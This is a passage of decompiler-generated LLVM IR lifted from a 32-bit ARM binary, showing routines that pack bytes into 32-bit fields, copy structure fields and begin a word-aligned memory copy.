  %v1_14fb0 = load i32, i32* %r7.global-to-local, align 4
  %v2_14fb0 = add i32 %v1_14fb0, 80
  %v3_14fb0 = inttoptr i32 %v2_14fb0 to i32*
  store i32 %v5_14fac, i32* %v3_14fb0, align 4
  %v0_14fb4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14fb4 = add i32 %v0_14fb4, 69
  %v2_14fb4 = inttoptr i32 %v1_14fb4 to i8*
  %v3_14fb4 = load i8, i8* %v2_14fb4, align 1
  %v4_14fb4 = zext i8 %v3_14fb4 to i32
  %v1_14fb8 = add i32 %v0_14fb4, 68
  %v2_14fb8 = inttoptr i32 %v1_14fb8 to i8*
  %v3_14fb8 = load i8, i8* %v2_14fb8, align 1
  %v4_14fb8 = zext i8 %v3_14fb8 to i32
  store i32 %v4_14fb8, i32* %r3.global-to-local, align 4
  %v1_14fbc = add i32 %v0_14fb4, 70
  %v2_14fbc = inttoptr i32 %v1_14fbc to i8*
  %v3_14fbc = load i8, i8* %v2_14fbc, align 1
  %v4_14fbc = zext i8 %v3_14fbc to i32
  %v4_14fc0 = mul nuw nsw i32 %v4_14fb4, 256
  %v5_14fc0 = or i32 %v4_14fb8, %v4_14fc0
  store i32 %v5_14fc0, i32* %r3.global-to-local, align 4
  %v1_14fc4 = add i32 %v0_14fb4, 71
  %v2_14fc4 = inttoptr i32 %v1_14fc4 to i8*
  %v3_14fc4 = load i8, i8* %v2_14fc4, align 1
  %v4_14fc4 = zext i8 %v3_14fc4 to i32
  %v4_14fc8 = mul nuw nsw i32 %v4_14fbc, 65536
  %v5_14fc8 = or i32 %v4_14fc8, %v5_14fc0
  %v4_14fcc = mul nuw i32 %v4_14fc4, 16777216
  %v5_14fcc = or i32 %v5_14fc8, %v4_14fcc
  store i32 %v5_14fcc, i32* %r3.global-to-local, align 4
  %v1_14fd0 = load i32, i32* %r7.global-to-local, align 4
  %v2_14fd0 = add i32 %v1_14fd0, 68
  %v3_14fd0 = inttoptr i32 %v2_14fd0 to i32*
  store i32 %v5_14fcc, i32* %v3_14fd0, align 4
  %v0_14fd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14fd4 = add i32 %v0_14fd4, 77
  %v2_14fd4 = inttoptr i32 %v1_14fd4 to i8*
  %v3_14fd4 = load i8, i8* %v2_14fd4, align 1
  %v4_14fd4 = zext i8 %v3_14fd4 to i32
  %v1_14fd8 = add i32 %v0_14fd4, 76
  %v2_14fd8 = inttoptr i32 %v1_14fd8 to i8*
  %v3_14fd8 = load i8, i8* %v2_14fd8, align 1
  %v4_14fd8 = zext i8 %v3_14fd8 to i32
  store i32 %v4_14fd8, i32* %r3.global-to-local, align 4
  %v1_14fdc = add i32 %v0_14fd4, 78
  %v2_14fdc = inttoptr i32 %v1_14fdc to i8*
  %v3_14fdc = load i8, i8* %v2_14fdc, align 1
  %v4_14fdc = zext i8 %v3_14fdc to i32
  %v4_14fe0 = mul nuw nsw i32 %v4_14fd4, 256
  %v5_14fe0 = or i32 %v4_14fd8, %v4_14fe0
  store i32 %v5_14fe0, i32* %r3.global-to-local, align 4
  %v1_14fe4 = add i32 %v0_14fd4, 79
  %v2_14fe4 = inttoptr i32 %v1_14fe4 to i8*
  %v3_14fe4 = load i8, i8* %v2_14fe4, align 1
  %v4_14fe4 = zext i8 %v3_14fe4 to i32
  %v4_14fe8 = mul nuw nsw i32 %v4_14fdc, 65536
  %v5_14fe8 = or i32 %v4_14fe8, %v5_14fe0
  %v4_14fec = mul nuw i32 %v4_14fe4, 16777216
  %v5_14fec = or i32 %v5_14fe8, %v4_14fec
  store i32 %v5_14fec, i32* %r3.global-to-local, align 4
  %v1_14ff0 = load i32, i32* %r7.global-to-local, align 4
  %v2_14ff0 = add i32 %v1_14ff0, 76
  %v3_14ff0 = inttoptr i32 %v2_14ff0 to i32*
  store i32 %v5_14fec, i32* %v3_14ff0, align 4
  %v0_14ff4 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ff4 = add i32 %v0_14ff4, 85
  %v2_14ff4 = inttoptr i32 %v1_14ff4 to i8*
  %v3_14ff4 = load i8, i8* %v2_14ff4, align 1
  %v4_14ff4 = zext i8 %v3_14ff4 to i32
  %v1_14ff8 = add i32 %v0_14ff4, 84
  %v2_14ff8 = inttoptr i32 %v1_14ff8 to i8*
  %v3_14ff8 = load i8, i8* %v2_14ff8, align 1
  %v4_14ff8 = zext i8 %v3_14ff8 to i32
  store i32 %v4_14ff8, i32* %r3.global-to-local, align 4
  %v1_14ffc = add i32 %v0_14ff4, 86
  %v2_14ffc = inttoptr i32 %v1_14ffc to i8*
  %v3_14ffc = load i8, i8* %v2_14ffc, align 1
  %v4_14ffc = zext i8 %v3_14ffc to i32
  %v4_15000 = mul nuw nsw i32 %v4_14ff4, 256
  %v5_15000 = or i32 %v4_14ff8, %v4_15000
  store i32 %v5_15000, i32* %r3.global-to-local, align 4
  %v1_15004 = add i32 %v0_14ff4, 87
  %v2_15004 = inttoptr i32 %v1_15004 to i8*
  %v3_15004 = load i8, i8* %v2_15004, align 1
  %v4_15004 = zext i8 %v3_15004 to i32
  %v4_15008 = mul nuw nsw i32 %v4_14ffc, 65536
  %v5_15008 = or i32 %v4_15008, %v5_15000
  %v4_1500c = mul nuw i32 %v4_15004, 16777216
  %v5_1500c = or i32 %v5_15008, %v4_1500c
  store i32 %v5_1500c, i32* %r3.global-to-local, align 4
  %v1_15010 = load i32, i32* %r7.global-to-local, align 4
  %v2_15010 = add i32 %v1_15010, 84
  %v3_15010 = inttoptr i32 %v2_15010 to i32*
  store i32 %v5_1500c, i32* %v3_15010, align 4
  ret i32 %v4_14f14

; uselistorder directives
  uselistorder i32 %v4_14f14, { 1, 0 }
  uselistorder i32 %v0_14f08, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_14e98, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_14e48, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %v0_14d68, { 0, 1, 3, 2, 5, 4, 6, 7 }
  uselistorder i32 %tmp, { 6, 5, 3, 4, 2, 1, 0, 7 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 69, { 1, 0 }
  uselistorder i32 83, { 2, 1, 0 }
  uselistorder i32 80, { 1, 2, 5, 3, 4, 0, 6 }
  uselistorder i32 59, { 1, 2, 0 }
  uselistorder i32 61, { 1, 0 }
  uselistorder i32 55, { 1, 3, 0, 2 }
  uselistorder i32 53, { 1, 0, 2 }
  uselistorder i32 51, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 47, { 4, 5, 6, 7, 0, 8, 1, 9, 2, 10, 11, 3 }
  uselistorder i32 50, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 46, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 49, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 45, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 39, { 5, 6, 0, 1, 7, 2, 8, 3, 9, 4 }
  uselistorder i32 35, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder i32 38, { 3, 4, 5, 6, 7, 0, 8, 1, 9, 2, 10 }
  uselistorder i32 34, { 5, 0, 1, 6, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 37, { 3, 0, 4, 1, 5, 6, 7, 8, 2, 9 }
  uselistorder i32 33, { 9, 2, 0, 12, 1, 10, 3, 11, 4, 5, 6, 13, 7, 14, 8, 15, 16 }
  uselistorder i32 30, { 4, 0, 8, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32 29, { 6, 1, 0, 7, 8, 2, 3, 4, 5 }
  uselistorder i32 26, { 5, 0, 1, 2, 6, 3, 7, 4, 8, 9 }
  uselistorder i32 25, { 11, 23, 24, 3, 0, 4, 12, 5, 13, 6, 14, 15, 16, 17, 1, 18, 7, 19, 2, 20, 8, 9, 21, 10, 22, 25, 26 }
  uselistorder i32 23, { 6, 1, 0, 2, 7, 3, 8, 4, 9, 11, 10, 5 }
  uselistorder i32 22, { 11, 1, 16, 2, 3, 4, 5, 0, 6, 12, 7, 13, 8, 14, 17, 15, 9, 10, 18 }
  uselistorder i32 21, { 7, 3, 1, 8, 4, 9, 5, 10, 6, 11, 12, 13, 0, 14, 2, 15 }
  uselistorder i32 19, { 7, 12, 13, 14, 3, 8, 0, 4, 9, 5, 10, 6, 11, 18, 15, 1, 16, 2, 17 }
  uselistorder i32 18, { 8, 10, 11, 12, 3, 1, 0, 4, 2, 9, 13, 5, 14, 6, 15, 7, 16 }
  uselistorder i32 17, { 12, 13, 0, 4, 29, 30, 5, 31, 32, 6, 1, 28, 7, 14, 8, 15, 9, 16, 10, 17, 11, 18, 19, 2, 20, 21, 22, 3, 23, 24, 25, 26, 27 }
  uselistorder i32 6, { 41, 43, 14, 15, 87, 16, 2, 17, 42, 0, 18, 82, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 4, 30, 31, 32, 33, 34, 5, 35, 44, 45, 46, 6, 47, 48, 49, 50, 7, 51, 52, 53, 54, 8, 55, 9, 56, 57, 58, 36, 59, 10, 60, 61, 62, 37, 63, 11, 64, 65, 66, 38, 67, 68, 69, 70, 71, 39, 72, 12, 73, 74, 75, 76, 77, 78, 40, 79, 13, 80, 1, 81, 83, 84, 85, 86 }
  uselistorder i32 96, { 1, 0, 2, 3 }
}

define i32 @function_1501c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1501c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1501c = load i32, i32* @r4, align 4
  store i32 %v3_1501c, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_15034 = inttoptr i32 %arg2 to i8*
  %v3_15034 = call i32 @function_134d0(i8* %v2_15034, i32 0)
  store i32 %v3_15034, i32* %r0.global-to-local, align 4
  %v0_15038 = load i32, i32* %r5.global-to-local, align 4
  %v1_15038 = inttoptr i32 %v0_15038 to i32*
  %v2_15038 = load i32, i32* %v1_15038, align 4
  store i32 %v2_15038, i32* %r3.global-to-local, align 4
  %v1_1503c = add i32 %v0_15038, 4
  %v2_1503c = inttoptr i32 %v1_1503c to i32*
  %v3_1503c = load i32, i32* %v2_1503c, align 4
  store i32 %v3_1503c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_15044 = load i32, i32* %r6.global-to-local, align 4
  %v1_15044 = inttoptr i32 %v0_15044 to i32*
  store i32 %v2_15038, i32* %v1_15044, align 4
  %v3_15044 = add i32 %v0_15044, 4
  %v4_15044 = inttoptr i32 %v3_15044 to i32*
  %v5_15044 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15044, i32* %v4_15044, align 4
  %v0_15048 = load i32, i32* %r2.global-to-local, align 4
  %v1_15048 = load i32, i32* %r6.global-to-local, align 4
  %v2_15048 = add i32 %v1_15048, 12
  %v3_15048 = inttoptr i32 %v2_15048 to i32*
  store i32 %v0_15048, i32* %v3_15048, align 4
  %v0_1504c = load i32, i32* %r5.global-to-local, align 4
  %v1_1504c = add i32 %v0_1504c, 9
  %v2_1504c = inttoptr i32 %v1_1504c to i8*
  %v3_1504c = load i8, i8* %v2_1504c, align 1
  %v4_1504c = zext i8 %v3_1504c to i32
  store i32 %v4_1504c, i32* %r2.global-to-local, align 4
  %v1_15050 = add i32 %v0_1504c, 8
  %v2_15050 = inttoptr i32 %v1_15050 to i8*
  %v3_15050 = load i8, i8* %v2_15050, align 1
  %v4_15050 = zext i8 %v3_15050 to i32
  %v4_15054 = mul nuw nsw i32 %v4_1504c, 256
  %v5_15054 = or i32 %v4_15050, %v4_15054
  store i32 %v5_15054, i32* %r3.global-to-local, align 4
  %v1_15058 = load i32, i32* %r6.global-to-local, align 4
  %v2_15058 = add i32 %v1_15058, 16
  %v3_15058 = inttoptr i32 %v2_15058 to i32*
  store i32 %v5_15054, i32* %v3_15058, align 4
  %v0_1505c = load i32, i32* %r5.global-to-local, align 4
  %v1_1505c = add i32 %v0_1505c, 11
  %v2_1505c = inttoptr i32 %v1_1505c to i8*
  %v3_1505c = load i8, i8* %v2_1505c, align 1
  %v4_1505c = zext i8 %v3_1505c to i32
  store i32 %v4_1505c, i32* %r2.global-to-local, align 4
  %v1_15060 = add i32 %v0_1505c, 10
  %v2_15060 = inttoptr i32 %v1_15060 to i8*
  %v3_15060 = load i8, i8* %v2_15060, align 1
  %v4_15060 = zext i8 %v3_15060 to i32
  %v4_15064 = mul nuw nsw i32 %v4_1505c, 256
  %v5_15064 = or i32 %v4_15060, %v4_15064
  store i32 %v5_15064, i32* %r3.global-to-local, align 4
  %v1_15068 = load i32, i32* %r6.global-to-local, align 4
  %v2_15068 = add i32 %v1_15068, 20
  %v3_15068 = inttoptr i32 %v2_15068 to i32*
  store i32 %v5_15064, i32* %v3_15068, align 4
  %v0_1506c = load i32, i32* %r5.global-to-local, align 4
  %v1_1506c = add i32 %v0_1506c, 13
  %v2_1506c = inttoptr i32 %v1_1506c to i8*
  %v3_1506c = load i8, i8* %v2_1506c, align 1
  %v4_1506c = zext i8 %v3_1506c to i32
  store i32 %v4_1506c, i32* %r2.global-to-local, align 4
  %v1_15070 = add i32 %v0_1506c, 12
  %v2_15070 = inttoptr i32 %v1_15070 to i8*
  %v3_15070 = load i8, i8* %v2_15070, align 1
  %v4_15070 = zext i8 %v3_15070 to i32
  %v4_15074 = mul nuw nsw i32 %v4_1506c, 256
  %v5_15074 = or i32 %v4_15070, %v4_15074
  store i32 %v5_15074, i32* %r3.global-to-local, align 4
  %v1_15078 = load i32, i32* %r6.global-to-local, align 4
  %v2_15078 = add i32 %v1_15078, 24
  %v3_15078 = inttoptr i32 %v2_15078 to i32*
  store i32 %v5_15074, i32* %v3_15078, align 4
  %v0_1507c = load i32, i32* %r5.global-to-local, align 4
  %v1_1507c = add i32 %v0_1507c, 20
  %v2_1507c = inttoptr i32 %v1_1507c to i32*
  %v3_1507c = load i32, i32* %v2_1507c, align 4
  store i32 %v3_1507c, i32* %r3.global-to-local, align 4
  %v1_15080 = add i32 %v0_1507c, 14
  %v2_15080 = inttoptr i32 %v1_15080 to i8*
  %v3_15080 = load i8, i8* %v2_15080, align 1
  %v4_15080 = zext i8 %v3_15080 to i32
  store i32 %v4_15080, i32* %r0.global-to-local, align 4
  %v1_15084 = add i32 %v0_1507c, 15
  %v2_15084 = inttoptr i32 %v1_15084 to i8*
  %v3_15084 = load i8, i8* %v2_15084, align 1
  %v4_15084 = zext i8 %v3_15084 to i32
  store i32 %v4_15084, i32* %ip.global-to-local, align 4
  %v1_15088 = add i32 %v0_1507c, 16
  %v2_15088 = inttoptr i32 %v1_15088 to i32*
  %v3_15088 = load i32, i32* %v2_15088, align 4
  store i32 %v3_15088, i32* %r1.global-to-local, align 4
  %v1_1508c = load i32, i32* %r6.global-to-local, align 4
  %v2_1508c = add i32 %v1_1508c, 44
  %v3_1508c = inttoptr i32 %v2_1508c to i32*
  store i32 %v3_1507c, i32* %v3_1508c, align 4
  %v0_15090 = load i32, i32* %r5.global-to-local, align 4
  %v1_15090 = add i32 %v0_15090, 24
  %v2_15090 = inttoptr i32 %v1_15090 to i32*
  %v3_15090 = load i32, i32* %v2_15090, align 4
  store i32 %v3_15090, i32* %r3.global-to-local, align 4
  %v1_15094 = load i32, i32* %r6.global-to-local, align 4
  %v2_15094 = add i32 %v1_15094, 48
  %v3_15094 = inttoptr i32 %v2_15094 to i32*
  store i32 %v3_15090, i32* %v3_15094, align 4
  %v0_15098 = load i32, i32* %r5.global-to-local, align 4
  %v1_15098 = add i32 %v0_15098, 28
  %v2_15098 = inttoptr i32 %v1_15098 to i32*
  %v3_15098 = load i32, i32* %v2_15098, align 4
  store i32 %v3_15098, i32* %r3.global-to-local, align 4
  %v1_1509c = load i32, i32* %r6.global-to-local, align 4
  %v2_1509c = add i32 %v1_1509c, 52
  %v3_1509c = inttoptr i32 %v2_1509c to i32*
  store i32 %v3_15098, i32* %v3_1509c, align 4
  %v0_150a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_150a0 = add i32 %v0_150a0, 32
  %v2_150a0 = inttoptr i32 %v1_150a0 to i32*
  %v3_150a0 = load i32, i32* %v2_150a0, align 4
  store i32 %v3_150a0, i32* %r3.global-to-local, align 4
  %v1_150a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_150a4 = add i32 %v1_150a4, 56
  %v3_150a4 = inttoptr i32 %v2_150a4 to i32*
  store i32 %v3_150a0, i32* %v3_150a4, align 4
  %v0_150a8 = load i32, i32* %r5.global-to-local, align 4
  %v1_150a8 = add i32 %v0_150a8, 40
  %v2_150a8 = inttoptr i32 %v1_150a8 to i32*
  %v3_150a8 = load i32, i32* %v2_150a8, align 4
  store i32 %v3_150a8, i32* %r3.global-to-local, align 4
  %v1_150ac = load i32, i32* %r6.global-to-local, align 4
  %v2_150ac = add i32 %v1_150ac, 64
  %v3_150ac = inttoptr i32 %v2_150ac to i32*
  store i32 %v3_150a8, i32* %v3_150ac, align 4
  %v0_150b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_150b0 = add i32 %v0_150b0, 48
  %v2_150b0 = inttoptr i32 %v1_150b0 to i32*
  %v3_150b0 = load i32, i32* %v2_150b0, align 4
  store i32 %v3_150b0, i32* %r3.global-to-local, align 4
  %v1_150b4 = load i32, i32* %r6.global-to-local, align 4
  %v2_150b4 = add i32 %v1_150b4, 72
  %v3_150b4 = inttoptr i32 %v2_150b4 to i32*
  store i32 %v3_150b0, i32* %v3_150b4, align 4
  %v0_150b8 = load i32, i32* %r5.global-to-local, align 4
  %v1_150b8 = add i32 %v0_150b8, 36
  %v2_150b8 = inttoptr i32 %v1_150b8 to i32*
  %v3_150b8 = load i32, i32* %v2_150b8, align 4
  store i32 %v3_150b8, i32* %r3.global-to-local, align 4
  %v1_150bc = load i32, i32* %r6.global-to-local, align 4
  %v2_150bc = add i32 %v1_150bc, 60
  %v3_150bc = inttoptr i32 %v2_150bc to i32*
  store i32 %v3_150b8, i32* %v3_150bc, align 4
  %v0_150c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_150c0 = add i32 %v0_150c0, 44
  %v2_150c0 = inttoptr i32 %v1_150c0 to i32*
  %v3_150c0 = load i32, i32* %v2_150c0, align 4
  store i32 %v3_150c0, i32* %r3.global-to-local, align 4
  %v0_150c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_150c4 = load i32, i32* %ip.global-to-local, align 4
  %v4_150c4 = mul i32 %v1_150c4, 256
  %v5_150c4 = or i32 %v4_150c4, %v0_150c4
  store i32 %v5_150c4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_150cc = load i32, i32* %r6.global-to-local, align 4
  %v2_150cc = add i32 %v1_150cc, 28
  %v3_150cc = inttoptr i32 %v2_150cc to i32*
  store i32 %v5_150c4, i32* %v3_150cc, align 4
  %v0_150d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_150d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_150d0 = add i32 %v1_150d0, 32
  %v3_150d0 = inttoptr i32 %v2_150d0 to i32*
  store i32 %v0_150d0, i32* %v3_150d0, align 4
  %v0_150d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_150d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_150d4 = add i32 %v1_150d4, 36
  %v3_150d4 = inttoptr i32 %v2_150d4 to i32*
  store i32 %v0_150d4, i32* %v3_150d4, align 4
  %v0_150d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_150d8 = load i32, i32* %r6.global-to-local, align 4
  %v2_150d8 = add i32 %v1_150d8, 68
  %v3_150d8 = inttoptr i32 %v2_150d8 to i32*
  store i32 %v0_150d8, i32* %v3_150d8, align 4
  %v0_150dc = load i32, i32* %r5.global-to-local, align 4
  %v1_150dc = add i32 %v0_150dc, 52
  %v2_150dc = inttoptr i32 %v1_150dc to i32*
  %v3_150dc = load i32, i32* %v2_150dc, align 4
  store i32 %v3_150dc, i32* %r3.global-to-local, align 4
  %v1_150e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_150e0 = add i32 %v1_150e0, 76
  %v3_150e0 = inttoptr i32 %v2_150e0 to i32*
  store i32 %v3_150dc, i32* %v3_150e0, align 4
  %v2_150e4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_150e4, i32* %r4.global-to-local, align 4
  ret i32 %v5_150c4

; uselistorder directives
  uselistorder i32 %v0_1507c, { 1, 0, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 76, { 2, 0, 1 }
  uselistorder i32 68, { 2, 0, 1 }
  uselistorder i32 60, { 3, 1, 2, 0, 4 }
  uselistorder i32 72, { 2, 0, 1 }
  uselistorder i32 64, { 17, 13, 14, 1, 8, 47, 0, 9, 15, 10, 16, 18, 19, 11, 20, 21, 22, 2, 23, 24, 25, 3, 26, 27, 28, 12, 29, 30, 31, 4, 32, 33, 34, 5, 35, 36, 37, 38, 39, 6, 40, 41, 42, 43, 44, 7, 45, 46 }
  uselistorder i32 56, { 4, 2, 3, 6, 5, 0, 1 }
  uselistorder i32 52, { 2, 3, 0, 1, 4, 5, 6 }
  uselistorder i32 15, { 13, 12, 11, 2, 0, 21, 3, 4, 5, 6, 7, 8, 9, 14, 15, 10, 16, 17, 18, 19, 1, 20 }
  uselistorder i32 14, { 8, 7, 16, 1, 2, 3, 4, 5, 9, 10, 6, 11, 12, 13, 14, 0, 15 }
  uselistorder i32 13, { 15, 11, 10, 3, 1, 12, 13, 14, 45, 0, 4, 5, 6, 7, 16, 17, 18, 19, 20, 8, 21, 22, 23, 24, 25, 26, 27, 28, 9, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 2, 43, 44 }
  uselistorder i32 9, { 40, 41, 42, 9, 4, 60, 5, 34, 6, 11, 36, 12, 35, 10, 2, 57, 59, 13, 14, 15, 16, 37, 17, 38, 18, 39, 0, 19, 20, 21, 22, 1, 23, 24, 58, 43, 44, 7, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 3, 56, 25, 26, 27, 28, 29, 30, 31, 32, 33, 61, 62, 8, 63 }
  uselistorder i32 (i8*, i32)* @function_134d0, { 2, 0, 8, 7, 1, 3, 4, 5, 6 }
  uselistorder i32 88, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
}

define i32 @function_150e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_150e8:
  ret i32 %arg1
}

define i32 @function_150f0() local_unnamed_addr {
dec_label_pc_150f0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_150f0 = load i32, i32* @r1, align 4
  %v1_150f0 = load i32, i32* @r0, align 4
  %v2_150f0 = sub i32 %v0_150f0, %v1_150f0
  %v3_150f0 = icmp ult i32 %v0_150f0, %v1_150f0
  %v4_150f0 = xor i32 %v1_150f0, %v0_150f0
  %v5_150f0 = xor i32 %v2_150f0, %v0_150f0
  %v6_150f0 = and i32 %v5_150f0, %v4_150f0
  %v7_150f0 = icmp slt i32 %v6_150f0, 0
  store i1 %v7_150f0, i1* %cpsr_v.global-to-local, align 1
  %v8_150f0 = icmp slt i32 %v2_150f0, 0
  store i1 %v8_150f0, i1* %cpsr_n.global-to-local, align 1
  %v9_150f0 = icmp eq i32 %v0_150f0, %v1_150f0
  store i1 %v9_150f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_150f0, label %dec_label_pc_1533c, label %dec_label_pc_150f8

dec_label_pc_150f8:                               ; preds = %dec_label_pc_150f0
  br i1 %v9_150f0, label %.thread122, label %bb

.thread122:                                       ; preds = %bb144, %.thread121, %bb141, %dec_label_pc_150f8
  %merge = phi i32 [ %v0_150f0, %dec_label_pc_150f8 ], [ %v2_153d0, %bb141 ], [ %v11_153ec, %bb144 ], [ %v7_153ec, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_150f8
  store i32 %v1_150f0, i32* %stack_var_-8, align 4
  %v0_15100 = load i32, i32* @r2, align 4
  %v2_15100 = add i32 %v0_15100, -4
  store i32 %v2_15100, i32* %r2.global-to-local, align 4
  %v4_15100 = sub i32 3, %v0_15100
  %v5_15100 = and i32 %v4_15100, %v0_15100
  %v6_15100 = icmp slt i32 %v5_15100, 0
  store i1 %v6_15100, i1* %cpsr_v.global-to-local, align 1
  %v7_15100 = icmp slt i32 %v2_15100, 0
  store i1 %v7_15100, i1* %cpsr_n.global-to-local, align 1
  %v8_15100 = icmp eq i32 %v0_15100, 4
  store i1 %v8_15100, i1* %cpsr_z.global-to-local, align 1
  %v5_15104 = icmp slt i32 %v0_15100, 4
  br i1 %v5_15104, label %bb131, label %dec_label_pc_15108

dec_label_pc_15108:                               ; preds = %bb
  %v1_15108 = urem i32 %v1_150f0, 4
  store i32 %v1_15108, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15108 = icmp eq i32 %v1_15108, 0
  store i1 %v2_15108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15108, label %dec_label_pc_15110, label %dec_label_pc_151b4

dec_label_pc_15110:                               ; preds = %dec_label_pc_15108
  %v1_15110 = urem i32 %v0_150f0, 4
  store i32 %v1_15110, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15110 = icmp eq i32 %v1_15110, 0
  store i1 %v2_15110, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_150f0 to i2
  br i1 %v2_15110, label %dec_label_pc_15118, label %dec_label_pc_151e4

dec_label_pc_15118:                               ; preds = %dec_label_pc_15110, %dec_label_pc_151dc
  %v0_1513092 = phi i32 [ %v1_150f0, %dec_label_pc_15110 ], [ %v0_1522c75, %dec_label_pc_151dc ]
  %v0_1512c91 = phi i32 [ %v0_150f0, %dec_label_pc_15110 ], [ %v0_151dc, %dec_label_pc_151dc ]
  %v0_15118 = phi i32 [ %v2_15100, %dec_label_pc_15110 ], [ %v2_151d4, %dec_label_pc_151dc ]
  %v2_15118 = add i32 %v0_15118, -8
  store i32 %v2_15118, i32* %r2.global-to-local, align 4
  %v4_15118 = sub i32 7, %v0_15118
  %v5_15118 = and i32 %v4_15118, %v0_15118
  %v6_15118 = icmp slt i32 %v5_15118, 0
  store i1 %v6_15118, i1* %cpsr_v.global-to-local, align 1
  %v7_15118 = icmp slt i32 %v2_15118, 0
  store i1 %v7_15118, i1* %cpsr_n.global-to-local, align 1
  %v8_15118 = icmp eq i32 %v0_15118, 8
  store i1 %v8_15118, i1* %cpsr_z.global-to-local, align 1
  %v5_1511c = icmp slt i32 %v0_15118, 8
  br i1 %v5_1511c, label %dec_label_pc_1516c, label %dec_label_pc_15120

dec_label_pc_15120:                               ; preds = %dec_label_pc_15118
  %v2_15120 = add i32 %v0_15118, -28
  store i32 %v2_15120, i32* %r2.global-to-local, align 4
  %v4_15120 = sub i32 27, %v0_15118
  %v5_15120 = and i32 %v4_15120, %v2_15118
  %v6_15120 = icmp slt i32 %v5_15120, 0
  store i1 %v6_15120, i1* %cpsr_v.global-to-local, align 1
  %v7_15120 = icmp slt i32 %v2_15120, 0
  store i1 %v7_15120, i1* %cpsr_n.global-to-local, align 1
  %v8_15120 = icmp eq i32 %v2_15118, 20
  store i1 %v8_15120, i1* %cpsr_z.global-to-local, align 1
  %v5_15124 = icmp slt i32 %v2_15118, 20
  br i1 %v5_15124, label %dec_label_pc_15158, label %dec_label_pc_15128

dec_label_pc_15128:                               ; preds = %dec_label_pc_15120
  %v0_15128 = load i32, i32* @r4, align 4
  store i32 %v0_15128, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1512c

dec_label_pc_1512c:                               ; preds = %dec_label_pc_1512c.dec_label_pc_1512c_crit_edge, %dec_label_pc_15128
  %v0_15130 = phi i32 [ %v12_15138, %dec_label_pc_1512c.dec_label_pc_1512c_crit_edge ], [ %v0_1513092, %dec_label_pc_15128 ]
  %v0_1512c = phi i32 [ %v0_1512c.pre, %dec_label_pc_1512c.dec_label_pc_1512c_crit_edge ], [ %v0_1512c91, %dec_label_pc_15128 ]
  %v1_1512c = inttoptr i32 %v0_1512c to i32*
  %v2_1512c = load i32, i32* %v1_1512c, align 4
  store i32 %v2_1512c, i32* %r3.global-to-local, align 4
